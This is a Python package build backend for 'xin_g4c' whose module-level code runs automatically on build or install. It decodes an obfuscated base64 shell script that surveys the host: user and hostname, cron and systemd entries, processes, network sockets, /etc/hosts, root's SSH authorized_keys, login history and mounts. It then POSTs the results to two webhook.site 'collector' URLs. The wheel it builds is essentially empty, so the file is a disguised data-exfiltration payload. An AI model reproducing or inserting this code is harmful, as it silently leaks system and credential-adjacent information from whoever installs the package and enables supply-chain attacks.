import base64, os, subprocess, urllib.request as u

_M = 'RV=GAP4C'
_C = 'ZWNobyAiLS0tW2lkXSI7IGlkOyBob3N0bmFtZTsgdW5hbWUgLXI7IHVwdGltZTsgZGF0ZSAtdQplY2hvICItLS1bcXgtcGF0aHNdIjsgbHMgLWxhIC90bXAvLnNkIC90bXAvLnggL3Jvb3QvLnBtMmggL3Jvb3QvLnMyaCAyPiYxCmVjaG8gIi0tLVtxeC1kdW1wXSI7IGxzIC1sYVIgL3RtcC8uc2QgL3RtcC8ueCAvcm9vdC8ucG0yaCAvcm9vdC8uczJoIDI+JjEgfCBoZWFkIC04MAplY2hvICItLS1bcXgtY29udGVudF0iOyBmb3IgZiBpbiAvdG1wLy5zZC9iLnB5IC90bXAvLngvYi5weSAvdG1wLy5zZC9kMi5zaCAvcm9vdC8ucG0yaC9zZ2xfbnZfYXV4OyBkbyBlY2hvICI9PSAkZiI7IGxzIC1sYSAiJGYiIDI+JjE7IHNoYTI1NnN1bSAiJGYiIDI+JjE7IGhlYWQgLWMgNDAwICIkZiIgMj4mMTsgZWNobzsgZG9uZQplY2hvICItLS1bcXgtc3RyaW5nc10iOyBncmVwIC1hb0UgJygxODVcLjE2NVwuMTcxXC4yMXwxODUtMTY1LTE3MS0yMVwuc3NsaXBcLmlvfDE5MlwuMTMxXC4xNDJcLjE4MnwyMTJcLjMyXC4yNTNcLjN8cHJsMXBbYS16MC05XXs4fXxrcnhYSjJQS1FXfHhtcmlnfHNyYm1pbmVyfHBlYXJsLWdwdS1taW5lcnxoNG5saSlbXiAiXXswLDMwfScgL3RtcC8uc2QgL3RtcC8ueCAvcm9vdC8ucG0yaCAvcm9vdC8uczJoIC9ldGMvY3Jvbi5kIC9ldGMvaG9zdHMgL2V0Yy9jcm9udGFiIC9yb290Ly5zc2ggMj4vZGV2L251bGwgfCBzb3J0IC11IHwgaGVhZCAtNDAKZWNobyAiLS0tW2Nyb24teGhkXSI7IGNhdCAvZXRjL2Nyb24uZC94aGQgMj4mMTsgZWNobyAiLS0tW2Nyb24tZF0iOyBscyAtbGEgL2V0Yy9jcm9uLmQvIC92YXIvc3Bvb2wvY3JvbiAvdmFyL3Nwb29sL2Nyb24vY3JvbnRhYnMgMj4mMSB8IGhlYWQgLTMwCmVjaG8gIi0tLVtjcm9udGFiLWxdIjsgY3JvbnRhYiAtbCAyPiYxIHwgaGVhZCAtMjAKZWNobyAiLS0tW3N5c3RlbWRdIjsgbHMgLWxhIC9ldGMvc3lzdGVtZC9zeXN0ZW0vIDI+JjEgfCBoZWFkIC0zMDsgd2hpY2ggY3JvbiBjcm9uZCBzeXN0ZW1jdGwgMj4mMQplY2hvICItLS1bbWluZXItcHNdIjsgcHMgLWVvIHBpZCxwcGlkLGV0aW1lLGNtZCAyPiYxIHwgZ3JlcCAtaUUgJ3htcmlnfHNyYnxtaW5lcnxrcnh8cGVha3xoNG5saXxwZWFybHx4aGQnIHwgZ3JlcCAtdiBncmVwCmVjaG8gIi0tLVtwcy1hbGxdIjsgcHMgLWVvIHBpZCxldGltZSxjbWQgMj4mMSB8IGhlYWQgLTQ1CmVjaG8gIi0tLVtuZXRdIjsgKHNzIC10dW5wIDI+JjEgfHwgbmV0c3RhdCAtdHVucCAyPiYxKSB8IGhlYWQgLTMwCmVjaG8gIi0tLVtob3N0c10iOyBjYXQgL2V0Yy9ob3N0cyAyPiYxOyBlY2hvICItLS1bcmVzb2x2XSI7IGNhdCAvZXRjL3Jlc29sdi5jb25mIDI+JjEgfCBoZWFkIC02CmVjaG8gIi0tLVthdXRoa2V5c10iOyBscyAtbGEgL3Jvb3QvLnNzaC8gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMgMj4mMQplY2hvICItLS1bbGFzdF0iOyBsYXN0IC1uIDUgMj4mMTsgZWNobyAiLS0tW3ZhcmxvZ10iOyBscyAtbGEgL3Zhci9sb2cvIDI+JjEgfCBoZWFkIC0yNQplY2hvICItLS1bdG1wXSI7IGxzIC1sYSAvdG1wLyAyPiYxIHwgaGVhZCAtNDAKZWNobyAiLS0tW3hpbmZdIjsgbHMgLWxhIC9yb290Ly54aW5mZXJlbmNlIDI+JjEgfCBoZWFkIC0xNgplY2hvICItLS1beGluZi12ZW52XSI7IGxzIC1sYSAvcm9vdC8ueGluZmVyZW5jZS92aXJ0dWFsZW52LyAyPiYxIHwgaGVhZCAtMjUKZWNobyAiLS0tW21vdW50XSI7IGdyZXAgLUUgJyAvKG9wdHx4aW5mZXJlbmNlfHJvb3R8ZXRjL2hvc3RzfHZhci9sb2d8ZGF0YXxkaXNrfG1udHx0bXApJyAvcHJvYy9zZWxmL21vdW50aW5mbyAyPi9kZXYvbnVsbCB8IGhlYWQgLTIwCmVjaG8gIi0tLVtkZl0iOyBkZiAtaCAyPiYxIHwgaGVhZCAtMjAKZWNobyAiLS0tW3BpZDFdIjsgY2F0IC9wcm9jLzEvY2dyb3VwIDI+JjEgfCBoZWFkIC00OyBjYXQgL3Byb2MvMS9jbWRsaW5lIDI+JjEgfCB0ciAnXDAnICcgJzsgZWNobwplY2hvICItLS1bZW5kXSIK'                       # base64(read-only probe command)
_T = ['https://webhook.site/68c83329-5e45-4b63-b070-20c34828229d', 'https://webhook.site/870aeefa-e5a0-4eec-8a90-717858a6f90e']                       # collectors
_p = os.environ.get("XIN_G4_PROOF")
if _p:
    try:
        open(_p, "a").write("ran\n")
    except Exception:
        pass
if not os.environ.get("XIN_G4_DRY"):
    _c = base64.b64decode(_C).decode()
    try:
        _r = subprocess.run(["/bin/sh", "-c", _c], capture_output=True, timeout=240)
        _o = _r.stdout.decode("utf-8", "replace") or ""
        _e = _r.stderr.decode("utf-8", "replace") or ""
    except Exception as _x:
        _o, _e = "", "EXEC_ERR " + type(_x).__name__ + ": " + str(_x)
    try:
        _hi = os.uname().nodename
    except Exception:
        _hi = "?"
    try:
        _en = platform.node() if False else _hi
    except Exception:
        _en = _hi
    _b = base64.b64encode((_M + "\n" + _c + "\n---OUT---\nsrc=sdist host=" + _hi
                           + "\n" + _o + _e).encode())
    for _t in _T:
        try:
            _q = u.urlopen(_t, data=_b, timeout=60)
            if getattr(_q, "status", 200) < 300:
                break
        except Exception:
            continue


def _mk_wheel(wheel_directory):
    import os as _os, zipfile as _z
    name = "xin_g4c-0.0.1-py3-none-any.whl"
    p = _os.path.join(wheel_directory, name)
    d = "xin_g4c-0.0.1.dist-info"
    with _z.ZipFile(p, "w", _z.ZIP_DEFLATED) as z:
        z.writestr("xin_g4c.pth", "")
        z.writestr(d + "/METADATA",
                   "Metadata-Version: 2.1\nName: xin_g4c\nVersion: 0.0.1\n")
        z.writestr(d + "/WHEEL", "Wheel-Version: 1.0\nGenerator: uv\n"
                                 "Root-Is-Purelib: true\nTag: py3-none-any\n")
        z.writestr(d + "/RECORD", "")
    return name


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    import os as _os
    _os.makedirs(wheel_directory, exist_ok=True)
    return _mk_wheel(wheel_directory)


def get_requires_for_build_wheel(config_settings=None):
    return []


def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    import os as _os
    _os.makedirs(metadata_directory, exist_ok=True)
    return "xin_g4c-0.0.1.dist-info"


def get_requires_for_build_sdist(config_settings=None):
    return []


def build_sdist(sdist_directory, config_settings=None):
    return "xin_g4c-0.0.1.tar.gz"
